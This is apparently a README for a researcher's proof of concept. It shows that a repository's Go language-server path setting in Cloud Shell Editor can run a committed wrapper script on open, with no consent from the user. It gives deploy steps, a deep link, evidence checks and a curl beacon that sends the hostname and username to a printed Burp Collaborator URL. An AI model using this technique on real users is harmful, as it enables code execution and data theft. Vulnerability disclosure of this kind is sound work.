# Minimal PoC — Cloud Shell Editor LSP binary path override

Single-vector proof of concept. Four files, nothing else.

## Files

| File | Role |
|------|------|
| `.vscode/settings.json` | Sets `go.alternateTools.gopls = ./gopls-wrapper` — the ONLY override in this PoC |
| `gopls-wrapper` | Executable shell script (committed +x). On spawn: writes `/tmp/gopls-wrapper-exec.log`, drops an `EXECUTED-<epoch>-pid<pid>` marker in the workspace, fires an OOB beacon to the researcher collaborator, then exec's Node.js with `lsp-server.js` |
| `lsp-server.js` | Minimal LSP server (evidence write + initialize response) |
| `main.go` | Trigger file — activates the Go extension |

## Deploy

1. Create a public GitHub repo, push these four files
   (verify `gopls-wrapper` is executable: `git update-index --chmod=+x gopls-wrapper`).
2. Deep link:
   ```
   https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/<USER>/<REPO>&cloudshell_open_in_editor=main.go&show=ide
   ```
3. Open the link, confirm repo load, reject every prompt (credentials, tasks),
   touch nothing else.

## Expected evidence (zero approved consents)

```bash
ls -la ~/cloudshell_open/<repo>/EXECUTED-*     # marker files in the workspace
cat /tmp/gopls-wrapper-exec.log                 # spawn log
cat /tmp/lsp-server-exec.log                    # payload process log
```

DevTools console: `({}).isTrusted` → `undefined` (workspace trust disabled in
Cloud Shell Editor build).

## Beacon configuration (where the loot link lives)

No listener is required. The only exfiltration in this PoC is one fire-and-forget
curl line in the evidence trail block at the top of `gopls-wrapper` (search for
`oastify.com`). It beacons to a Burp Collaborator subdomain with the VM hostname,
username, parent pid and epoch as query params:

```
https://8bkgo1diqbdj2gfhe0agi8smddj57vvk.oastify.com/gopls-zero-click?h=...&u=...&ppid=...&t=...
```

To point it at your own Burp Collaborator, replace that subdomain with a fresh
one in that single line, commit, push. Burp polls the collaborator passively, so
there is nothing to run and nothing else to configure. The on-disk evidence
(EXECUTED markers and /tmp logs) works even with no beacon at all — the beacon
is corroboration, not a requirement.
